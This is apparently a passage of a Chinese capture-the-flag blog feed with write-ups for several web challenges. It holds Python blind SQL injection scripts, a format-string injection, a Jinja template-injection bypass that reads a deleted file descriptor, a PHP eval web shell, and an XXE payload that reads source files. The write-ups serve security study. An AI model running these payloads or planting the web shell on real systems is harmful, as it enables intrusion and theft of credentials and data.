<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    l=<span class="number">28</span></span><br><span class="line">    h=<span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(h - l) &gt; <span class="number">1</span>:</span><br><span class="line">        m=(l+h)/<span class="number">2</span></span><br><span class="line">        pay=<span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line">        <span class="comment">#pay=&quot;database()&quot;</span></span><br><span class="line">        e = <span class="string">&quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pay, i, m)</span><br><span class="line">        data = <span class="string">&quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;])</span></span><br><span class="line">        re=requests.post(url+<span class="string">&quot;?_POST[code]=&quot;</span>+data.strip(<span class="string">&#x27;code=&#x27;</span>),data=data,headers=headers)</span><br><span class="line">        <span class="comment">#print(re.text)</span></span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#exit()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;http://gamectf.com/p/CGBU.png&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            l=m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h=m</span><br><span class="line">    mid_num = <span class="built_in">int</span>((l + h + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    text += <span class="built_in">chr</span>(<span class="built_in">int</span>(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="TryToLogin"><a href="#TryToLogin" class="headerlink" title="TryToLogin"></a>TryToLogin</h1><p>这道题目是格式化字符串注入，感觉有必要学习一下,sprintf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line">text&#x3D;&#39;&#39;</span><br><span class="line">proxies&#x3D;&#123;</span><br><span class="line">&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    l&#x3D;28</span><br><span class="line">    h&#x3D;126</span><br><span class="line">    while abs(h - l) &gt; 1:</span><br><span class="line">        m&#x3D;(l+h)&#x2F;2</span><br><span class="line">        pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br><span class="line">        pay&#x3D;&quot;select * from fl4g&quot;</span><br><span class="line">        e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m)</span><br><span class="line">        data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39;</span><br><span class="line">        re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers)</span><br><span class="line">        if &#39;登录成功了&#39; in re.text:</span><br><span class="line">            l&#x3D;m</span><br><span class="line">        else:</span><br><span class="line">            h&#x3D;m</span><br><span class="line">    text +&#x3D; chr(int(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>这道题比较新有意思的点在两个地方：</p>
<p>过滤了这个地方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>

<p>过滤了左右花括号,这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>如果满足条件，则会输出<del>p0</del>，否则就不会输出。第二点，我们该读取什么文件呢？</p>
<p>这里运用了os.system(“rm -f /flag”)</p>
<p>默认的进程删除后会存放在暂时文件中，进程为：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>

<p>故编写脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>CISCN2019DAY2WEB1</title>
    <url>/2020/11/16/CISCN2019DAY2WEB1/</url>
    <content><![CDATA[<p>虽然对于SQL注入我个人是相当不屑的。当前的环境下已经存在彻底磨灭SQL注入的技术了，但是比赛出现的频率依然不低，所以只能把它捡回来了。。orz</p>
<h1 id="拿到文件"><a href="#拿到文件" class="headerlink" title="拿到文件"></a>拿到文件</h1><p>先从这道题开始说吧，扫目录能扫出来robots.txt,下面有*.php.bak,提示我们可以尝试读取文件，</p>
<p>得到代码我将他稍微修改方便fuzz之后长这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//    include &quot;config.php&quot;;</span></span><br><span class="line"></span><br><span class="line">    $id = $_POST[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">echo</span> $id;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    $id=addslashes($id);</span><br><span class="line">    $path=addslashes($path);</span><br><span class="line">    <span class="keyword">echo</span> $id;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    $id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">    $path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line">    <span class="keyword">echo</span> $id;</span><br><span class="line"><span class="comment">//    $result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span></span><br><span class="line"><span class="comment">//    $row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    $path=&quot;./&quot; . $row[&quot;path&quot;];</span></span><br><span class="line"><span class="comment">//    header(&quot;Content-Type: image/jpeg&quot;);</span></span><br><span class="line"><span class="comment">//    readfile($path);</span></span><br></pre></td></tr></table></figure>

<h1 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h1><p>我们想要得到的目标是什么，很明显，这道题的查询语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$result=mysqli_query($con,&quot;<span class="keyword">select</span> * <span class="keyword">from</span> images <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">&#x27;&#123;$id&#125;&#x27;</span> <span class="keyword">or</span> <span class="keyword">path</span>=<span class="string">&#x27;&#123;$path&#125;&#x27;</span><span class="string">&quot;);</span></span><br></pre></td></tr></table></figure>

<h2 id="注入原理分析"><a href="#注入原理分析" class="headerlink" title="注入原理分析"></a>注入原理分析</h2><p>其中id和path都是我们可控的，在这种情况下，我们其实可以通过吞掉id后面的单引号的方式，进而达到控制查询语句的操作，如图所示：</p>
<p><img src="image-20201116182200504.png" alt="image-20201116182200504"></p>
<p>在SQL语句当中，\转义也是存在的，只要该符号存在，便会自动的对数据进行转义，比如：</p>
<p>如果 在单引号面前加上\，就会被系统认定为字符串类型的 ‘ ,也就起不到闭合语句的作用了。</p>
<p>回到注入上来，我们如果想要逃逸掉对id的注入，想要自己控制语句的话，应该构造如下代码：</p>
<p><img src="image-20201116182632668.png" alt="image-20201116182632668"></p>
<p>通过上面的分析我们可以知道，id后面的单引号由于被\进行了修饰，也就无法起到闭合的作用了，而 name的部分被我们的单引号闭合之后，再通过或逻辑，就可以控制任意查询了。</p>
<h2 id="题目的绕过"><a href="#题目的绕过" class="headerlink" title="题目的绕过"></a>题目的绕过</h2><p>上面一段中我们已经知道第一步的中我们的目标是对id进行控制，使得id最终输出的值最终为 斜杠（\），这样就可以使用path进行注入了，但是我们发现id和path其实都被修饰了，也就无法直接输入斜杠来绕过，利用上面的代码演示如下：</p>
<p><img src="image-20201116183108301.png" alt="image-20201116183108301"></p>
<p>这道题的关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br></pre></td></tr></table></figure>

<p>我们首先要知道的是，虽然这里写的是\0 ,然而实际上依然是\0,前面的\是用于转义的。</p>
<p>这样想的话，我们便可以通过构造\0的方式来尝试绕过</p>
<p>顺序如下</p>
<p>我们输入的为”\0”  -&gt; 经过addslashes函数之后”\\0”,再经过str_replace函数之后即为\了，</p>
<p><img src="image-20201116184057753.png" alt="image-20201116184057753"></p>
<p>那这里可能就有人想问了，为什么不用\‘ 来绕过，这是因为如果使用\ 和 ‘组合方式，经过addslashes的时候这两个符号都会被转义，这样的话我们就没有办法利用str_replace函数，于是我们构造payload第一步如下：</p>
<p>逐步fuzz..</p>
<p><img src="image-20201116190519711.png" alt="image-20201116190519711"></p>
<p>最终在mysql当中得到如下语句可以fuzz：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> websites <span class="keyword">where</span> <span class="keyword">id</span> = <span class="keyword">if</span>( <span class="keyword">ord</span>( <span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>() ),<span class="number">1</span>,<span class="number">1</span> ))&gt;<span class="number">145</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>于是构造出在url当中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn&#x2F;image.php?id&#x3D;\0&amp;path&#x3D;or id&#x3D;if( ord( substr((select database() ),1,1 ))&gt;&#x3D;99,1,0) %23</span><br></pre></td></tr></table></figure>

<p>那么就该构造脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"><span class="comment"># 上面的id一定要手动加上一个\进行转义，不然会出错的</span></span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line"><span class="comment"># print(len(requests.get(&quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\0&amp;path= or&quot;).text))</span></span><br><span class="line"><span class="comment"># len = 117007</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>, <span class="number">140</span>):</span><br><span class="line">        sql = <span class="string">&quot;or id=if( ord( substr((select password from users ),&#123;&#125;,1 ))&gt;=&#123;&#125;,1,0) %23&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        <span class="comment"># print(url+sql)</span></span><br><span class="line">        <span class="comment"># databasename = djtdogjob</span></span><br><span class="line">        res = requests.get(url + sql).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt; <span class="number">1170</span>:</span><br><span class="line">            print(<span class="built_in">len</span>(res))</span><br><span class="line">            print(<span class="built_in">chr</span>(j<span class="number">-1</span>))</span><br><span class="line">            flag += <span class="built_in">chr</span>(j<span class="number">-1</span>)</span><br><span class="line">            print(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>过了非常非常久才出来..其实建议用二分法脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a624b8c4-8225-4f4b-8681-7f29d013c51b.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    mid = (l + r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        payloads = payload.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment"># print(url+payloads)</span></span><br><span class="line">        html = requests.get(url+payloads)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            l = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l + r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    result+=<span class="built_in">chr</span>(mid)</span><br><span class="line">    print(result)</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>再之后是利用短标签上传PHP文件</p>
<p>除此之外我们也要注意到的是他这里是将你的filename写入到这个文件下面，所以我们将一句话写道这个文件下面</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="image-20201116205648287.png" alt="image-20201116205648287"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP的一个内置类</title>
    <url>/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/</url>
    <content><![CDATA[<p>某店里比赛题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$ra,$rb</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        $c = $ra;</span></span><br><span class="line"><span class="comment">//        $c = $rb;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc=$_GET[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line">$rb=$_GET[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line">$ra=$_GET[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line">$rd=$_GET[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line">$method= <span class="keyword">new</span> $rc($ra, $rb);</span><br><span class="line">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>

<p>我们可以控制四个参数，但是我们明显知道，这里的User类完全没有意义，题目给出提示让我们想想还有什么类，想了半天应该是内置类，队里的w4nder师傅直接给我exp了，WTM直接开舔</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>FBCTF2018RCEService</title>
    <url>/2020/11/17/FBCTF2018RCEService/</url>
    <content><![CDATA[<p>要盲试试出来。。。大佬说是有源码：</p>
